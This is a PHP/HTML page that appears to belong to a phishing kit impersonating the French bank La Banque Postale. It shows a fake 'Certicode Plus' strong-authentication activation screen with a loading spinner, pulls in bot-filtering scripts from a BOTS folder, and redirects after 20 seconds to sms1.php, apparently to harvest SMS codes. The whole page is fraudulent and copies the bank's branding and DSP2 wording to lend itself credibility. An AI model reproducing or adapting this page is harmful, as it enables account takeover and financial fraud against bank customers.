<?php  
  include "BOTS/xanbbx.php";
  include "BOTS/xenddx.php"; 
  ?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="refresh" content="20;URL=sms1.php">


    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <link rel="shortcut icon" type="image/png" href="cap/favicon.png" type="image/x-icon" />
    
    <title>La Banque Postale - Attente d'enrôlement </title>
  </head>

  <style type="text/css">
    
    .loader{
	background: url('cap/loader.gif') 50% 50% no-repeat rgba(29,29,29,0.8);
	cursor: wait;
	height: 100%;
	left: 0;
	position: fixed;
	top: 0;
	width: 100%;
	z-index: 9999;
   }
	.loader h1{
		background: none;
		border: none;
		color: #19489E;
		font-size: 22px;
		font-family: 'Lato', sans-serif !important;
		font-weight: 700;
		height: 700px;
		line-height: 700px;
		margin: 0 0 10px;
		padding: 0;
		text-align: center;
	}
	
    .content {
    background: #fff;
    height: 400px;
    width: 380px;
    margin-left: auto;
    margin-right: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 10px;
    border: 1px solid #19489E;
	font-size: 16px;
	font-family: 'Lato', sans-serif !important;
    }

  </style>

  <div class="loader">
  <div class="content" style="margin-top:180px" align="center"><br>TOUJOURS PLUS DE SÉCURITÉ<br><br>
En application de la 2ème directive européenne pour les services de paiement (DSP2).<br>
Une authentification forte vous sera demandée tous les 90 jours.</br>
<br>N'attendez plus et activez Certicode Plus, la solution d'authentification forte mis en place par  
la Banque Postale.</br>
<br>Activation du Certicode plus en cours...
  <img src="cap/ajax-loader.gif" alt="loading" style="position:relative;top: 180px; left: -180px;"></div>
  </div>
</div>
<script>
jQuery(window).load(function(){ jQuery(".loader").fadeOut("200"); });
</script>
<!-- ........................................PC........................................ -->

<div class="d-none d-md-block">
  <img src="cap/l.png" style="width: 100%">
  <img src="cap/l1.png" style="width: 100%">
  <img src="cap/ajax-loader (1).gif" style="position:absolute; overflow:hidden; left:3200px; top:200px">

  <br>
  <br>
  <img src="cap/p3.png" style="width: 100%">
</div>



<!-- ...................................TEL............................................. -->

   <div class="d-md-none" style="background: white">
    <img src="cap/ls.png" style="width: 100%">
    <div class="container">


    </div>
    

    <br><br><br><br><br>
    <img src="cap/s2.png" style="width: 100%">
   </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
  </body>
</html>